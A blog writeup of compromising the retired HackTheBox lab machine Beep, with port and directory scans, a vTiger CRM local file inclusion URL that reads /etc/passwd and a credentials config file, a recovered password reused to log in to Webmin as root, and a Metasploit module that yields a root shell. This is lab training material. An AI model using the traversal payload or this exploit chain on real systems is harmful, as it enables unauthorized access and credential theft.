---
layout: post
title: "Writeup: HackTheBox Beep - with Metasploit"
description: "Rooting Beep using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines. Whether
 or not I use Metasploit to pwn the server will be indicated in the title.
 
# Beep

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.7</small>_

My initial port scan reveals a whole lot of ports open on this server.

```bash
sudo nmap -sS -T4 -p- 10.10.10.7

Host is up (0.015s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
878/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s                                                                                             
3306/tcp  open  mysql                                                                                             
4190/tcp  open  sieve                                                                                             
4445/tcp  open  upnotifyp                                                                                         
4559/tcp  open  hylafax                                                                                           
5038/tcp  open  unknown                                                                                           
10000/tcp open  snet-sensor-mgmt
```

Digging into the ports, I get the following:

```


sudo nmap -sS -p 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 -A -sV -sC 10.10.10.7

Host is up (0.014s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: CATENATE OK SORT URLAUTHA0001 ATOMIC STARTTLS BINARY LIST-SUBSCRIBED IMAP4 LISTEXT ACL SORT=MODSEQ Completed ID CHILDREN LITERAL+ CONDSTORE IDLE NO MULTIAPPEND ANNOTATEMORE NAMESPACE RIGHTS=kxte UNSELECT THREAD=ORDEREDSUBJECT X-NETSCAPE QUOTA THREAD=REFERENCES RENAME IMAP4rev1 MAILBOX-REFERRALS UIDPLUS
443/tcp   open  ssl/https?
|_ssl-date: 2020-05-22T21:19:28+00:00; +4m51s from scanner time.
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|media device|PBX|WAP|specialized|printer|storage-misc
Running (JUST GUESSING): Linux 2.6.X|2.4.X (95%), Linksys embedded (94%), Riverbed RiOS (94%), HP embedded (94%), Gemtek embedded (93%), Siemens embedded (93%), IBM embedded (93%)
OS CPE: cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:linux:linux_kernel:2.6.27 cpe:/o:linux:linux_kernel:2.4.32 cpe:/h:linksys:wrv54g cpe:/o:riverbed:rios cpe:/h:gemtek:p360 cpe:/h:siemens:gigaset_se515dsl cpe:/h:ibm:ds4700
Aggressive OS guesses: Linux 2.6.18 (95%), Linux 2.6.9 - 2.6.24 (95%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.27 (likely embedded) (95%), Linux 2.6.20-1 (Fedora Core 5) (95%), Linux 2.6.27 (95%), Linux 2.6.30 (95%), Linux 2.6.5 - 2.6.12 (95%), Linux 2.6.8 (Debian 3.1) (95%), Linux 2.6.9-22.0.1.EL (CentOS 4.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 4m50s

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   14.93 ms 10.10.14.1
2   15.02 ms 10.10.10.7
```

What stand out to me are the following:

- Web server on 80 redirects to 443
- This web server runs Apache httpd 2.2.3 on a CentOS machine
- MySQL running on port 3306
- **Web server on 10000 is running Webmin with Miniserv version 1.5.70**

Lets start with some enumeration of these two web servers.
My directory brute force tool of choice is [gobuster][].

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -k -u https://10.10.10.7

======================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.7
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt                                             
[+] Status codes:   200,204,301,302,307,401,403                                                                   
[+] User Agent:     gobuster/3.0.1                                                                                
[+] Timeout:        10s                                                                                           
===============================================================                                                   
2020/05/22 17:37:59 Starting gobuster                                                                             
===============================================================                                                   
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
/cgi-bin/ (Status: 403)
/configs (Status: 301)
/favicon.ico (Status: 200)
/help (Status: 301)
/images (Status: 301)
/lang (Status: 301)
/libs (Status: 301)
/mail (Status: 301)
/modules (Status: 301)
/panel (Status: 301)
/recordings (Status: 301)
/robots.txt (Status: 200)
/static (Status: 301)
/themes (Status: 301)
/var (Status: 301)
/vtigercrm (Status: 301)
===============================================================
2020/05/22 17:42:08 Finished
==============================================================
```

I poke at the `/configs`, which contain come config files but do not render in the browser, and `/admin`, which prompts me for Basic Auth credentials.
I try some defaults like `admin/admin` but do not get anywhere.

I see `/vtigercrm` at the end, let's dig into that...

Navigating to `https://10.10.10.7/vtigercrm/index.php`, we see a login for a CRM page.
The footer of the page contains: `vtiger CRM 5.1.0`.

Looking for vulnerabilities for this version of `vtiger` shows this:

```bash
searchsploit vtiger 5.1.0

-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
vTiger CRM 5.1.0 - Local File Inclusion                                         | php/webapps/18770.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Opening that exploit, it tells me that this version of `vTiger CRM` is vulnerable to LFI at the path:

`https://localhost/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00`

I replace `localhost` with `10.10.10.7`, and sure enough I get the dump of `/etc/passwd`.

> root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash distcache:x:94:94:Distcache:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin pcap:x:77:77::/var/arpwatch:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash dbus:x:81:81:System message bus:/:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin spamfilter:x:500:500::/home/spamfilter:/bin/bash haldaemon:x:68:68:HAL daemon:/:/sbin/nologin xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin fanis:x:501:501::/home/fanis:/bin/bash

A couple of things to note from this file:

- The only non-system user appears to be `fanis`. So the user flag wil be at `/home/fanis/user.txt`.
- Of all of the system users, `Asterisk VoIP PBX` catches my eye.

> FreePBX is a web-based open source GUI (graphical user interface) that controls and manages Asterisk (PBX), an open source communication server.

So FreePBX manages the Asterisk server.

From <https://www.asterisk.org/community/asteriskexchange/freepbx>, we learn that some of the default Asterisk configuration files are:

- `/etc/amportal.conf`
- `/etc/passwd`
- `/etc/asterisk/*`

In particular, the `/etc/amportal.conf` file holds most of Asterisk's configuration.
I want to read it.

Using `vTiger CRM`'s LFI vulnerability, we can read this file with the following request in the browser:

`https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/amportal.conf%00`

Don't forget the null terminator `%00` at the end of the request like I did.

This gives us a large dump of information.

![amportal.conf file contents](/img/htb/beep/pbx-password.png)

The file contains a password at `AMPDBUSER=asteriskuser AMPDBPASS=jEhdIekWmdjE`.
I also notice `AMPMGRUSER=admin AMPMGRPASS=jEhdIekWmdjE`.

So this password appears to be reused across accounts.
In particular, it is used for what I presume is the "AMP manager user."

I don't have an immediate need to read other files, so let's move to the other web server now.

At `https://10.10.10.7:10000/`, we are presented with a login page for [Webmin][], " a web-based interface for system administration for Unix."

I try to log in as the default Webmin `root` user with the password I found, `jEhdIekWmdjE`.
It is successful.
Now we're talking.

Searchsploit lists a number of exploits for Webmin:

```
searchsploit webmin

------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Trave | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion            | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion        | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                    | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                           | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                     | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                          | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                          | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (M | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                     | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)        | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution ( | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                        | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metas | linux/remote/47230.rb
Webmin 1.x - HTML Email Command Execution                   | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosur | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosur | multiple/remote/2017.pl
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

I notice there's a RCE module for Metasploit listed.
I start up `msfconsole` and `search webmin`.

The `exploit/unix/webapp/webmin_upload_exec` module interests me.
The information on this module says it works against any Webmin version under 1.9.0.
Since we are on 1.5.70, I feel good about this exploit.

From the available payloads, I select `cmd/unix/bind_perl`.
I use `root` and `jEhdIekWmdjE` as the username and password settings for this exploit, which are required.

I execute this exploit and get a root shell. Nice!

From here I get a TTY shell with:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

and collect the user and root flags from `/home/fanis/user.txt` and `/root/root.txt`.

[hackthebox]: https://www.hackthebox.eu

[gobuster]: https://github.com/OJ/gobuster
[webmin]: http://www.webmin.com/
 